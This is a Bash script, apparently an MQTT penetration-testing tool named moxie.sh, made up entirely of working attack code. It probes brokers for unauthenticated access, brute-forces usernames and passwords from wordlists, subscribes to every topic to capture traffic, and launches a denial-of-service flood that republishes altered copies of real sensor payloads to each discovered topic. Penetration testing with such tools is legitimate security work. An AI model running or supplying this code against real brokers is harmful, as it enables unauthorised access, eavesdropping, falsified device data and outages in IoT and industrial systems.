#!/bin/bash

# Color variables
green='\033[0;32m'
yellow='\033[1;33m'
blue='\033[0;34m'
bold='\033[1m'
red='\033[0;31m'
cyan='\033[0;36m'
magenta='\033[0;35m'
reset='\033[0m'

verbose=true

check_mqtt_service() {
    ip=$1
    port=$2
    encoded_cert_entry=$3
    cert_file=""

    if [[ -n "$encoded_cert_entry" ]]; then
        b64_cert="${encoded_cert_entry#*base64,}"
        cert_file=$(mktemp)
        echo "$b64_cert" | base64 -d > "$cert_file"
        #echo -e "Certificate file: $cert_file"
        #cat "$cert_file"
    fi

    echo -e "${blue}Checking MQTT service on ${cyan}${ip}:${port}${reset}${blue}...${reset}"

    if [[ -n "$cert_file" ]]; then
        output=$(mosquitto_pub -h "$ip" -p "$port" -t "test" -m "Testing MQTT service" --cafile "$cert_file" 2>&1)
        
        if echo "$output" | grep -q "not authorised"; then
            echo -e "${yellow}MQTT service on ${cyan}${ip}:${port}${reset}${yellow} also requires credentials.${reset}"
            echo -e "${yellow}Try brute-forcing with the ${bold}-b${reset}${yellow} option.${reset}"
            return 1
        else
            echo -e "${green}MQTT service is accessible on ${cyan}${ip}:${port}${reset}${green} with certificate but without credentials${reset}"
            return 0
        fi
    else
        output=$(mosquitto_pub -h "$ip" -p "$port" -t "test" -m "Testing MQTT service" 2>&1)
        
        if echo "$output" | grep -q "Error: Protocol error"; then
            echo -e "${yellow}MQTT service on ${cyan}${ip}:${port}${reset}${yellow} requires certificate.${reset}"
            return 1
        elif echo "$output" | grep -q "not authorised"; then
            echo -e "${yellow}MQTT service on ${cyan}${ip}:${port}${reset}${yellow} only requires credentials.${reset}"
            echo -e "${yellow}Try brute-forcing with the ${bold}-b${reset}${yellow} option.${reset}"
            return 1
        else
            echo -e "${green}MQTT service is accessible on ${cyan}${ip}:${port}${reset}${green} without authentication${reset}"
            return 0
        fi
    fi
}

advanced_scan() {
    ip=$1
    port=$2
    username=$3
    password=$4

    echo -e "${blue}Performing advanced scan using ${magenta}nmap${reset}${blue}...${reset}"
    nmap -p "$port" -sS -sV -sC -A -Pn -vv --script mqtt-subscribe "$ip" --script-args "username=$username,password=$password"
}

brute_force_attack() {
    ip=$1
    port=$2
    encoded_username_entry=$3
    encoded_password_entry=$4
    encoded_cert_entry=$5

    b64_user="${encoded_username_entry#*base64,}"
    b64_pass="${encoded_password_entry#*base64,}"

    username_file=$(mktemp)
    password_file=$(mktemp)
    cert_file=""

    echo "$b64_user" | base64 -d > "$username_file"
    echo -e "Username file: $username_file"
    cat "$username_file"

    echo "$b64_pass" | base64 -d > "$password_file"
    echo -e "Password file: $password_file"
    cat "$password_file"

    if [[ -n "$encoded_cert_entry" ]]; then
        b64_cert="${encoded_cert_entry#*base64,}"
        cert_file=$(mktemp)
        echo "$b64_cert" | base64 -d > "$cert_file"
        echo -e "Certificate file: $cert_file"
        cat "$cert_file"
    fi

    if [[ ! -s "$username_file" || ! -s "$password_file" ]]; then
        echo -e "${red}Error: Decoded username or password wordlist is empty or invalid.${reset}"
        rm -f "$username_file" "$password_file" "$cert_file"
        exit 1
    fi

    echo -e "${blue}Performing brute-force attack on MQTT service...${reset}"
    while IFS= read -r username; do
        while IFS= read -r password; do
            [[ $verbose == true ]] && echo -e "${cyan}Trying username: ${yellow}${username}${reset}${cyan} and password: ${yellow}${password}${reset}"

            if [[ -n "$cert_file" ]]; then
                mosquitto_pub -d -h "$ip" -p "$port" -t "test" -m "Testing MQTT service" -u "$username" -P "$password" --cafile "$cert_file" &> /dev/null
            else
                mosquitto_pub -d -h "$ip" -p "$port" -t "test" -m "Testing MQTT service" -u "$username" -P "$password" &> /dev/null
            fi

            if [[ $? -eq 0 ]]; then
                echo -e "${green}Successfully accessed MQTT service on ${cyan}${ip}:${port}${reset}${green} with username: ${yellow}${username}${reset}${green} and password: ${yellow}${password}${reset}"
                rm -f "$username_file" "$password_file" "$cert_file"
                return 0
            fi
        done < "$password_file"
    done < "$username_file"

    echo -e "${red}Failed to access MQTT service with the provided username and password wordlists.${reset}"
    rm -f "$username_file" "$password_file" "$cert_file"
    return 1
}

check_mqtt_transactions() {
    ip=$1
    port=$2
    username=$3
    password=$4
    encoded_cert_entry=$5
    duration=$6
    cert_file=""

    if [[ -n "$encoded_cert_entry" ]]; then
        b64_cert="${encoded_cert_entry#*base64,}"
        cert_file=$(mktemp)
        echo "$b64_cert" | base64 -d > "$cert_file"
        echo -e "Certificate file: $cert_file"
        cat "$cert_file"
    fi

    set -m

    if [[ -n "$cert_file" ]]; then
        if [[ -z "$username" && -z "$password" ]]; then
            echo -e "${cyan}Attempting to connect only with certificate...${reset}"
            mosquitto_sub -h "$ip" -p "$port" -t "#" -v --cafile "$cert_file" &
        else
            echo -e "${cyan}Attempting to connect with provided certificate and credentials...${reset}"
            mosquitto_sub -h "$ip" -p "$port" -t "#" -u "$username" -P "$password" -v --cafile "$cert_file" &
        fi
    else
        if [[ -z "$username" && -z "$password" ]]; then
            echo -e "${cyan}Attempting to connect without authentication...${reset}"
            mosquitto_sub -h "$ip" -p "$port" -t "#" -v &
        else
            echo -e "${cyan}Attempting to connect with provided credentials...${reset}"
            mosquitto_sub -h "$ip" -p "$port" -t "#" -u "$username" -P "$password" -v &
        fi
    fi

    pid=$!
    sleep "$duration"
    kill -- -$pid

    if [[ $? -eq 0 ]]; then
        echo -e "${green}Successfully listed transactions on ${cyan}${ip}:${port}${reset}"
    else
        echo -e "${yellow}Failed to list transactions. Please check your credentials or try brute-forcing with the ${bold}-b${reset}${yellow} option.${reset}"
    fi
}

dos_attack() {
    ip=$1
    port=$2
    username=$4
    password=$5
    encoded_cert_entry=$6
    topic="#"
    connections=$3
    delay=0.0001

    cert_file=""
    if [[ -n "$encoded_cert_entry" ]]; then
        b64_cert="${encoded_cert_entry#*base64,}"
        cert_file=$(mktemp)
        echo "$b64_cert" | base64 -d > "$cert_file"
    fi

    echo "[*] Starting MQTT DoS attack on $ip:$port with $connections clients..."

    declare -A topic_map
    declare -A payload_map

    while read -r topic payload; do
        topic_map["$topic"]=1
        payload_map["$topic"]="$payload"
    done < <(timeout 5 mosquitto_sub -h "$ip" -p "$port" --cafile "$cert_file" -u "$username" -P "$password" -t '#' -v)

    topics=("${!topic_map[@]}")

    echo "[*] Discovered ${#topics[@]} unique topics:"
    printf '  - %s\n' "${topics[@]}"
    echo "[*] Launching DoS attack with $connections publishes per topic..."

    for topic in "${topics[@]}"; do
        [[ "$topic" == *status ]] && echo "[!] Skipping status topic: $topic" && continue

        original_payload="${payload_map[$topic]}"

        for i in $(seq 1 "$connections"); do
            (
                for j in {1..5}; do
                    if echo "$original_payload" | jq empty 2>/dev/null; then
                        offset=$(shuf -i 5-15 -n 1)
                        sign=$((RANDOM % 2 == 0 ? 1 : -1))
                        message=$(echo "$original_payload" | jq \
                            --argjson O "$offset" \
                            --argjson S "$sign" \
                            'to_entries | map({
                                key,
                                value: (if (.value | type) == "number"
                                        then .value + ($O * $S)
                                        else .value end)
                            }) | from_entries')
                    else
                        message="$original_payload"
                    fi

                    mosquitto_pub -h "$ip" -p "$port" \
                        --cafile "$cert_file" \
                        --insecure \
                        -u "$username" -P "$password" \
                        -t "$topic" -m "$message" -q 0 \
                        --id "attacker-$(shuf -i 1000-9999 -n 1)" &

                    sleep "$delay"
                done
            ) &
        done

        echo "[+] Flooding topic: $topic..."
    done

    wait
    echo "[*] DoS attack dispatched. Check broker stability."

    [[ -n "$cert_file" ]] && rm -f "$cert_file"
}


display_usage() {
    echo -e "${bold}Usage:${reset}"
    echo -e "  ${bold}moxie.sh <option> [ip] [port] [username]/[username file] [password]/[password file] [certificate] [duration] ${reset}"
    echo
    echo -e "${bold}Options:${reset}"
    echo -e "  ${bold}-c, --check${reset}         Check MQTT service"
    echo -e "  ${bold}-s, --scan${reset}          Perform advanced scan (Only without TLS)"
    echo -e "  ${bold}-b, --bruteforce${reset}    Conduct brute-force attack"
    echo -e "  ${bold}-t, --transactions${reset}  Check MQTT transactions"
    echo -e "  ${bold}-d, --DoS attack${reset}    Make a DoS attack"
    echo -e "  ${bold}-h, --help${reset}          Display this help message"
}

main() {
    echo -e "${cyan}"
    echo "  ___  __________   _______ _____  "
    echo "  |  \/  |  _  \ \ / /_   _|  ___|"
    echo "  | .  . | | | |\ V /  | | | |__   "
    echo "  | |\/| | | | |/   \  | | |  __|  "
    echo "  | |  | \ \_/ / /^\ \_| |_| |___  "
    echo "  \_|  |_/\___/\/   \/\___/\____/  "
    echo "         The MQTT Pentester    "
    echo "                               "
    echo "         Author: aravind0x7    "
    echo -e "${reset}"

    if [[ $# -eq 0 ]]; then
        display_usage
        exit 1
    fi

    while [[ $# -gt 0 ]]; do
        case $1 in
            -c|--check)
                [[ $# -ne 3 && $# -ne 4 ]] && {
                    echo -e "${red}Error: IP address and port number, and certificate (if necessary) are required.${reset}"
                    display_usage
                    exit 1
                }
                check_mqtt_service "$2" "$3" "$4"
                exit $? ;;

            -s|--scan)
                [[ $# -ne 3 && $# -ne 5 ]] && {
                    echo -e "${red}Error: IP, port, username, and password if necessary.${reset}"
                    display_usage
                    exit 1
                }
                advanced_scan "$2" "$3" "$4" "$5"
                exit $? ;;

            -b|--bruteforce)
                [[ $# -ne 3 && $# -ne 5 && $# -ne 6 ]] && {
                    echo -e "${red}Error: IP, port, password/user files, and cert required.${reset}"
                    display_usage
                    exit 1
                }
                brute_force_attack "$2" "$3" "$4" "$5" "$6"
                exit $? ;;

            -t|--transactions)
                [[ $# -ne 4 && $# -ne 7 ]] && {
                    echo -e "${red}Error: IP, port, credentials, cert (if needed), and duration required.${reset}"
                    display_usage
                    exit 1
                }
                check_mqtt_transactions "$2" "$3" "$4" "$5" "$6" "$7"
                exit $? ;;

            -d|--dos)
                [[ $# -ne 4 && $# -ne 6 && $# -ne 7 ]] && {
                    echo -e "${red}Error: IP, port, connections, credentials, cert (if needed) required.${reset}"
                    display_usage
                    exit 1
                }
                dos_attack "$2" "$3" "$4" "$5" "$6" "$7"
                exit $? ;;

            -v|--verbose)
                verbose=true ;;

            -h|--help)
                display_usage
                exit 0 ;;

            *)
                echo -e "${red}Error: Invalid option.${reset}"
                display_usage
                exit 1 ;;
        esac
        shift
    done
}

main "$@"
